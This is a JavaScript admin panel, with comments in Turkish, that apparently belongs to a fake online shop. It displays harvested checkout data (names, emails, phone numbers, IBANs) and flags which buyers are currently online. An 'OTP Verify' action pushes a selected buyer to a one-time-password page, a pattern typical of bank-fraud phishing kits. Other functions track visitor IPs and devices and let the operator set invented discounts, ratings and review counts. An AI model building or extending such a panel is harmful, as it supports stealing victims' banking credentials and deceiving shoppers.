// Activity Log Functions
function addActivityLog(data) {
    const logContainer = document.getElementById('activityLog');
    const noLogs = logContainer.querySelector('.no-logs');
    
    if (noLogs) {
        noLogs.remove();
    }
    
    const logItem = document.createElement('div');
    logItem.className = 'log-item';
    
    const time = new Date().toLocaleTimeString('tr-TR');
    logItem.innerHTML = `
        <div class="log-message">${data.message || 'Kullanıcı aktivitesi'}</div>
        <div class="log-time">${time}</div>
    `;
    
    logContainer.insertBefore(logItem, logContainer.firstChild);
    
    // Keep only last 50 logs
    const logs = logContainer.querySelectorAll('.log-item');
    if (logs.length > 50) {
        logs[logs.length - 1].remove();
    }
}

// Load Purchases (Checkout Data)
async function loadPurchases() {
    const tbody = document.getElementById('purchasesTableBody');
    tbody.innerHTML = '<tr><td colspan="8" class="loading">Yükleniyor...</td></tr>';
    
    try {
        const response = await fetch('/api/checkout');
        const data = await response.json();
        
        if (data.error) {
            tbody.innerHTML = `<tr><td colspan="8" class="empty-state">${data.error}</td></tr>`;
            return;
        }
        
        if (data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="8" class="empty-state">Henüz checkout kaydı yok</td></tr>';
            return;
        }
        
        tbody.innerHTML = data.map(checkout => {
            const rowClass = checkout.isOnline ? 'online-row' : '';
            const onlineBadge = checkout.isOnline ? '<span style="color: #28a745; font-weight: bold;">● Online</span>' : '';
            return `
            <tr class="${rowClass}" style="${checkout.isOnline ? 'background-color: #d4edda;' : ''}">
                <td>${checkout.email || '-'} ${onlineBadge}</td>
                <td>${checkout.firstname || '-'}</td>
                <td>${checkout.lastname || '-'}</td>
                <td>${checkout.phone || '-'}</td>
                <td>${checkout.iban || '-'}</td>
                <td>${checkout.total ? checkout.total.toFixed(2) + ' €' : '-'}</td>
                <td>${new Date(checkout.createdAt).toLocaleString('tr-TR')}</td>
                <td>
                    <button class="btn-action" onclick="showActionButtons('${checkout._id}')">İşlem</button>
                    <div id="action-buttons-${checkout._id}" style="display: none; margin-top: 5px;">
                        <button class="btn-otp" onclick="goToOTPVerify('${checkout._id}')">OTP Verify</button>
                    </div>
                </td>
            </tr>
        `;
        }).join('');
    } catch (error) {
        console.error('Checkout verileri yüklenirken hata:', error);
        tbody.innerHTML = '<tr><td colspan="8" class="empty-state">Veriler yüklenirken bir hata oluştu</td></tr>';
    }
}

// Show action buttons
function showActionButtons(checkoutId) {
    const buttonsDiv = document.getElementById('action-buttons-' + checkoutId);
    if (buttonsDiv) {
        buttonsDiv.style.display = buttonsDiv.style.display === 'none' ? 'block' : 'none';
    }
}

// Go to OTP verify page
function goToOTPVerify(checkoutId) {
    // Redirect user to OTP verify page using checkout endpoint
    window.open('/api/checkout?id=' + checkoutId + '&redirect=true', '_blank');
}

// View Purchase Details
function viewPurchase(id) {
    // Bu fonksiyon daha sonra detay modalı için kullanılabilir
    console.log('Satın alma detayı:', id);
}

// Load Stats
async function loadStats() {
    try {
        const response = await fetch('/api/stats');
        const data = await response.json();
        
        if (data.totalCarts !== undefined) {
            document.getElementById('totalCarts').textContent = data.totalCarts;
        }
        
        if (data.onlineUsers !== undefined) {
            document.getElementById('onlineUsers').textContent = data.onlineUsers;
        }
    } catch (error) {
        console.error('İstatistikler yüklenirken hata:', error);
    }
}

// Get Browser Fingerprint - IP ve Browser bilgisi ile unique ID oluştur
function getBrowserFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Browser fingerprint', 2, 2);
    
    const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        canvasHash: canvas.toDataURL().substring(0, 100),
        localStorage: typeof(Storage) !== "undefined",
        sessionStorage: typeof(sessionStorage) !== "undefined"
    };
    
    return btoa(JSON.stringify(fingerprint)).substring(0, 50);
}

// Get or Create User ID
function getUserId() {
    let userId = localStorage.getItem('userId');
    if (!userId) {
        userId = 'user-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('userId', userId);
    }
    return userId;
}

// Send Heartbeat - GET isteği ile IP adresi ile online kontrol
// Network'ten görünür - Response gelirse kullanıcı online
async function sendHeartbeat() {
    try {
        // GET isteği at - IP adresi otomatik olarak request'ten alınır
        // Network tab'ında /api/heartbeat görünecek
        const timestamp = Date.now();
        const heartbeatUrl = `/api/heartbeat?t=${timestamp}&r=${Math.random()}`;
        
        console.log('🔄 Heartbeat gönderiliyor...', heartbeatUrl);
        
        const response = await fetch(heartbeatUrl, {
            method: 'GET',
            cache: 'no-store',
            headers: {
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            }
        });
        
        console.log('📡 Heartbeat response:', response.status, response.statusText);
        
        // Response gelirse kullanıcı online sayılır - OK dönerse online
        if (response && response.ok) {
            const data = await response.json();
            console.log('✅ Heartbeat OK - Response:', data);
            if (data.status === 'ok') {
                console.log('✅ Kullanıcı ONLINE - IP:', data.ip, 'Tarih:', new Date(data.timestamp).toLocaleTimeString('tr-TR'));
                return true;
            }
        }
        console.warn('⚠️ Heartbeat başarısız - Status:', response?.status);
        return false;
    } catch (error) {
        console.error('❌ Heartbeat hatası:', error);
        return false;
    }
}

// Update Online Users - Online kullanıcı sayısını güncelle
async function updateOnlineUsers() {
    try {
        console.log('🔄 Online kullanıcı sayısı güncelleniyor...');
        const response = await fetch('/api/online-users?t=' + Date.now(), {
            method: 'GET',
            cache: 'no-store',
            headers: {
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache'
            }
        });
        
        console.log('📡 Online users response:', response.status);
        
        if (response && response.ok) {
            const data = await response.json();
            console.log('📊 Online users data:', data);
            if (data.count !== undefined) {
                document.getElementById('onlineUsers').textContent = data.count;
                console.log('✅ Online kullanıcı sayısı güncellendi:', data.count);
            }
        } else {
            console.warn('⚠️ Online users response başarısız:', response.status);
        }
    } catch (error) {
        console.error('❌ Çevrimiçi kullanıcı sayısı yüklenirken hata:', error);
    }
}

// Load Activities (polling fallback)
async function loadActivities() {
    try {
        const response = await fetch('/api/activity');
        const data = await response.json();
        
        if (data.length > 0) {
            const logContainer = document.getElementById('activityLog');
            const noLogs = logContainer.querySelector('.no-logs');
            
            if (noLogs) {
                noLogs.remove();
            }
            
            // Clear existing logs
            logContainer.innerHTML = '';
            
            data.forEach(activity => {
                const logItem = document.createElement('div');
                logItem.className = 'log-item';
                const time = new Date(activity.createdAt).toLocaleTimeString('tr-TR');
                logItem.innerHTML = `
                    <div class="log-message">${activity.message || 'Kullanıcı aktivitesi'}</div>
                    <div class="log-time">${time}</div>
                `;
                logContainer.appendChild(logItem);
            });
        }
    } catch (error) {
        console.error('Aktiviteler yüklenirken hata:', error);
    }
}

// Ürün listesi
let products = [];
let editingProductId = null;

function renderProductsTable() {
    const tbody = document.getElementById('productsTableBody');
    if (!tbody) return;

    if (!products || products.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" class="empty-state">Henüz ürün yok</td></tr>';
        return;
    }

    tbody.innerHTML = products.map(p => {
        const rp = p.realPrice != null ? p.realPrice.toFixed(2) + ' ₺' : '-';
        const dp = p.discountedPrice != null ? p.discountedPrice.toFixed(2) + ' ₺' : '-';
        const disc = p.discountPercent != null ? p.discountPercent.toFixed(2) + ' %' : '-';
        const yr = (p.rating != null ? p.rating.toFixed(1) : '-') + ' / ' + (p.reviews || 0);
        return `
            <tr>
                <td>${p.name || '-'}</td>
                <td>${rp}</td>
                <td>${dp}</td>
                <td>${disc}</td>
                <td>${yr}</td>
                <td>
                    <button class="btn-view" onclick="editProduct('${p._id}')">Düzenle</button>
                    <button class="btn-danger" onclick="deleteProduct('${p._id}')" style="margin-left:6px;">Sil</button>
                </td>
            </tr>
        `;
    }).join('');
}

async function loadProducts() {
    console.log('🔄 Ürünler yükleniyor (API)...');
    const tbody = document.getElementById('productsTableBody');
    if (tbody) {
        tbody.innerHTML = '<tr><td colspan="6" class="loading">Yükleniyor...</td></tr>';
    }

    try {
        const response = await fetch('/api/products');
        console.log('📡 /api/products response status:', response.status);

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        console.log('📊 /api/products data:', data);

        if (Array.isArray(data)) {
            products = data;
        } else {
            console.warn('⚠️ /api/products response array değil:', data);
            products = [];
        }

        renderProductsTable();
    } catch (error) {
        console.error('❌ Ürünler yüklenirken hata:', error);
        if (tbody) {
            tbody.innerHTML = '<tr><td colspan="6" class="empty-state">Ürünler yüklenirken bir hata oluştu</td></tr>';
        }
    }
}

function addProductFromForm() {
    const nameEl = document.getElementById('productNameInput');
    const realPriceEl = document.getElementById('realPriceInput');
    const discountedPriceEl = document.getElementById('discountedPriceInput');
    const discountPercentEl = document.getElementById('discountPercentInput');
    const imageEl = document.getElementById('productImageInput');
    const ratingEl = document.getElementById('productRatingInput');
    const reviewsEl = document.getElementById('productReviewsInput');

    if (!nameEl || !realPriceEl || !discountedPriceEl || !discountPercentEl || !imageEl || !ratingEl || !reviewsEl) {
        console.error('❌ Ürün form elemanları bulunamadı');
        return;
    }

    const name = nameEl.value.trim();
    const realPrice = parseFloat(realPriceEl.value);
    const discountedPrice = parseFloat(discountedPriceEl.value);
    let discountPercent = parseFloat(discountPercentEl.value);
    const imageUrl = imageEl.value.trim();
    const rating = parseFloat(ratingEl.value);
    const reviews = parseInt(reviewsEl.value, 10);

    if (!name || isNaN(realPrice) || isNaN(discountedPrice)) {
        alert('Lütfen ürün adı, gerçek fiyat ve indirimli fiyat alanlarını doldurun');
        return;
    }

    // Eğer indirim yüzdesi boşsa, otomatik hesapla
    if (isNaN(discountPercent)) {
        if (realPrice > 0) {
            discountPercent = ((realPrice - discountedPrice) / realPrice) * 100;
        } else {
            discountPercent = 0;
        }
    }

    const product = {
        name,
        realPrice,
        discountedPrice,
        discountPercent,
        imageUrl,
        rating: isNaN(rating) ? null : rating,
        reviews: isNaN(reviews) ? 0 : reviews,
        category: '-' // Şimdilik sabit, sonra kategori alanı eklenebilir
    };

    // API'ye kaydet (ekleme veya güncelleme)
    const isEdit = !!editingProductId;
    const url = isEdit ? `/api/products?id=${editingProductId}` : '/api/products';
    const method = isEdit ? 'PUT' : 'POST';

    fetch(url, {
        method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(product)
    })
    .then(async (res) => {
        console.log(`📡 /api/products ${method} status:`, res.status);
        const data = await res.json().catch(() => ({}));
        console.log(`📡 /api/products ${method} response:`, data);

        if (!res.ok || (method === 'POST' && !data.success)) {
            throw new Error(data.message || 'Ürün kaydedilirken bir hata oluştu');
        }

        if (method === 'POST') {
            console.log('✅ Ürün başarıyla kaydedildi:', data.product);
        } else {
            console.log('✅ Ürün güncellendi');
        }

        // Formu temizle
        nameEl.value = '';
        realPriceEl.value = '';
        discountedPriceEl.value = '';
        discountPercentEl.value = '';
        imageEl.value = '';
        ratingEl.value = '';
        reviewsEl.value = '';

        // Edit moddan çık
        editingProductId = null;
        const btn = document.getElementById('btnAddProduct');
        if (btn) btn.textContent = '➕ Ürün Ekle';
        const cancelBtn = document.getElementById('btnCancelEdit');
        if (cancelBtn) cancelBtn.style.display = 'none';

        // Listeleri tekrar yükle
        loadProducts();
    })
    .catch((error) => {
        console.error('❌ Ürün kaydedilirken hata:', error);
        alert('❌ Ürün kaydedilirken bir hata oluştu: ' + error.message);
    });
}

// Edit / Delete helpers
window.editProduct = function(id) {
    const p = products.find(x => x._id === id);
    if (!p) return;
    document.getElementById('productNameInput').value = p.name || '';
    document.getElementById('realPriceInput').value = p.realPrice != null ? p.realPrice : '';
    document.getElementById('discountedPriceInput').value = p.discountedPrice != null ? p.discountedPrice : '';
    document.getElementById('discountPercentInput').value = p.discountPercent != null ? p.discountPercent : '';
    document.getElementById('productImageInput').value = p.imageUrl || '';
    document.getElementById('productRatingInput').value = p.rating != null ? p.rating : '';
    document.getElementById('productReviewsInput').value = p.reviews != null ? p.reviews : '';
    const datasheetEl = document.getElementById('productDatasheetEnabled');
    if (datasheetEl) datasheetEl.checked = !!p.datasheetEnabled;
    const energyClassEl = document.getElementById('productEnergyClass');
    if (energyClassEl) energyClassEl.value = p.energyClass || 'A';
    editingProductId = id;
    const btn = document.getElementById('btnAddProduct');
    if (btn) btn.textContent = '💾 Kaydet';
    const cancelBtn = document.getElementById('btnCancelEdit');
    if (cancelBtn) cancelBtn.style.display = 'inline-block';
};

window.deleteProduct = function(id) {
    if (!confirm('Bu ürünü silmek istediğinize emin misiniz?')) return;
    fetch(`/api/products?id=${id}`, { method: 'DELETE' })
        .then(res => res.json())
        .then(data => {
            if (!data.success) throw new Error('Silinemedi');
            loadProducts();
        })
        .catch(err => {
            console.error('Silme hatası:', err);
            alert('❌ Ürün silinemedi');
        });
};
// Load Visitors
async function loadVisitors() {
    const tbody = document.getElementById('visitorsTableBody');
    if (!tbody) {
        console.error('❌ visitorsTableBody elementi bulunamadı');
        return;
    }
    
    tbody.innerHTML = '<tr><td colspan="5" class="loading">Yükleniyor...</td></tr>';
    
    try {
        console.log('🔄 Ziyaretçiler yükleniyor...');
        const response = await fetch('/api/visitors');
        console.log('📡 Response status:', response.status, response.statusText);
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('📊 Ziyaretçiler data:', data);
        console.log('📊 Data type:', typeof data, 'Is array:', Array.isArray(data));
        console.log('📊 Data length:', data.length);
        
        if (data.error) {
            console.error('❌ API error:', data.error);
            tbody.innerHTML = `<tr><td colspan="5" class="empty-state">${data.error}</td></tr>`;
            return;
        }
        
        if (!Array.isArray(data)) {
            console.error('❌ Data bir array değil:', data);
            tbody.innerHTML = '<tr><td colspan="5" class="empty-state">Veri formatı hatalı</td></tr>';
            return;
        }
        
        if (data.length === 0) {
            console.log('⚠️ Ziyaretçi kaydı yok');
            tbody.innerHTML = '<tr><td colspan="5" class="empty-state">Henüz ziyaretçi kaydı yok</td></tr>';
            return;
        }
        
        console.log('✅ Ziyaretçiler tabloya yazılıyor:', data.length, 'kayıt');
        
        tbody.innerHTML = data.map(visitor => {
            const deviceType = visitor.deviceType || 'Unknown';
            const deviceIcon = deviceType === 'iOS' ? '🍎' : 
                              deviceType === 'Android' ? '🤖' : 
                              deviceType === 'Windows' ? '🪟' : 
                              deviceType === 'macOS' ? '💻' : 
                              deviceType === 'Linux' ? '🐧' : '❓';
            
            return `
                <tr>
                    <td>${visitor.ip || '-'}</td>
                    <td>${deviceIcon} ${deviceType}</td>
                    <td>${visitor.firstVisit ? new Date(visitor.firstVisit).toLocaleString('tr-TR') : '-'}</td>
                    <td>${visitor.lastVisit ? new Date(visitor.lastVisit).toLocaleString('tr-TR') : '-'}</td>
                    <td>${visitor.visitCount || 0}</td>
                </tr>
            `;
        }).join('');
        
        console.log('✅ Ziyaretçiler başarıyla yüklendi');
    } catch (error) {
        console.error('❌ Ziyaretçiler yüklenirken hata:', error);
        console.error('❌ Error message:', error.message);
        console.error('❌ Stack trace:', error.stack);
        tbody.innerHTML = '<tr><td colspan="5" class="empty-state">Veriler yüklenirken bir hata oluştu: ' + error.message + '</td></tr>';
    }
}

// Clear Visitors
async function clearVisitors() {
    if (!confirm('Tüm ziyaretçi kayıtlarını silmek istediğinize emin misiniz?')) {
        return;
    }
    
    try {
        const response = await fetch('/api/visitors', {
            method: 'DELETE'
        });
        
        const data = await response.json();
        
        if (data.success) {
            alert(`✅ ${data.deletedCount || 0} ziyaretçi kaydı silindi`);
            loadVisitors(); // Listeyi yenile
        } else {
            alert('❌ Ziyaretçiler silinirken bir hata oluştu');
        }
    } catch (error) {
        console.error('Ziyaretçiler silinirken hata:', error);
        alert('❌ Ziyaretçiler silinirken bir hata oluştu');
    }
}

// Global erişim için fonksiyonları window'a ekle (inline handler ihtimali için)
window.loadPurchases = loadPurchases;
window.loadVisitors = loadVisitors;
window.clearVisitors = clearVisitors;
window.loadProducts = loadProducts;
window.addProductFromForm = addProductFromForm;

// Initialize - Sayfa yüklendiğinde çalışır
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Admin panel yüklendi');
    
    // Navigation - Event listener'ları DOM hazır olduktan sonra ekle
    console.log('📌 Navigation event listener\'lar ekleniyor...');
    const navItems = document.querySelectorAll('.nav-item');
    console.log('📌 Bulunan nav item sayısı:', navItems.length);
    
    navItems.forEach(item => {
        const section = item.getAttribute('data-section');
        console.log('📌 Nav item ekleniyor:', section);
        
        item.addEventListener('click', (e) => {
            e.preventDefault();
            console.log('🖱️ Nav item tıklandı:', section);
            
            // Update active nav
            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
            item.classList.add('active');
            
            // Update active section
            const sectionElement = document.getElementById(section);
            if (!sectionElement) {
                console.error('❌ Section bulunamadı:', section);
                return;
            }
            
            document.querySelectorAll('.content-section').forEach(sec => sec.classList.remove('active'));
            sectionElement.classList.add('active');
            
            console.log('✅ Section aktif edildi:', section);
            
            // Section'a göre veri yükle
            if (section === 'visitors') {
                console.log('🔄 Ziyaretçiler yükleniyor (navigation)...');
                loadVisitors();
            } else if (section === 'products') {
                console.log('🔄 Ürünler yükleniyor (navigation)...');
                loadProducts();
            } else if (section === 'purchases') {
                console.log('🔄 Satın almalar yükleniyor (navigation)...');
                loadPurchases();
            } else if (section === 'logs') {
                console.log('🔄 Loglar yükleniyor (navigation)...');
                loadStats();
                loadActivities();
                updateOnlineUsers();
            }
        });
    });
    
    console.log('✅ Navigation event listener\'lar eklendi');
    
    // Ürün ekle butonu
    const btnAddProduct = document.getElementById('btnAddProduct');
    if (btnAddProduct) {
        btnAddProduct.addEventListener('click', (e) => {
            e.preventDefault();
            console.log('➕ Ürün ekle butonuna basıldı');
            addProductFromForm();
        });
    }
    // Edit iptal butonu
    let cancelBtn = document.getElementById('btnCancelEdit');
    if (!cancelBtn) {
        cancelBtn = document.createElement('button');
        cancelBtn.id = 'btnCancelEdit';
        cancelBtn.textContent = 'İptal';
        cancelBtn.className = 'btn-danger';
        cancelBtn.style.marginLeft = '10px';
        cancelBtn.style.display = 'none';
        const btnWrap = document.getElementById('btnAddProduct')?.parentElement;
        if (btnWrap) btnWrap.appendChild(cancelBtn);
    }
    cancelBtn.addEventListener('click', () => {
        editingProductId = null;
        document.getElementById('productNameInput').value = '';
        document.getElementById('realPriceInput').value = '';
        document.getElementById('discountedPriceInput').value = '';
        document.getElementById('discountPercentInput').value = '';
        document.getElementById('productImageInput').value = '';
        document.getElementById('productRatingInput').value = '';
        document.getElementById('productReviewsInput').value = '';
        const btn = document.getElementById('btnAddProduct');
        if (btn) btn.textContent = '➕ Ürün Ekle';
        cancelBtn.style.display = 'none';
    });

    // İlk yükleme
    loadPurchases();
    loadStats();
    loadActivities();
    updateOnlineUsers();
    
    // Her 10 saniyede bir online kullanıcı sayısını güncelle
    const onlineUsersInterval = setInterval(() => {
        updateOnlineUsers();
    }, 10000); // 10 saniye
    
    // Her 30 saniyede bir stats güncelle
    const statsInterval = setInterval(() => {
        loadStats();
        loadActivities();
        // Aktif section'ı kontrol et, eğer visitors ise yenile
        const activeSection = document.querySelector('.content-section.active');
        if (activeSection && activeSection.id === 'visitors') {
            loadVisitors();
        }
    }, 30000); // 30 saniye
    
    // Cleanup (sayfa kapatılırken interval'ları temizle)
    window.addEventListener('unload', () => {
        clearInterval(statsInterval);
        clearInterval(onlineUsersInterval);
    });
    
    console.log('✅ Admin panel başlatıldı');
});

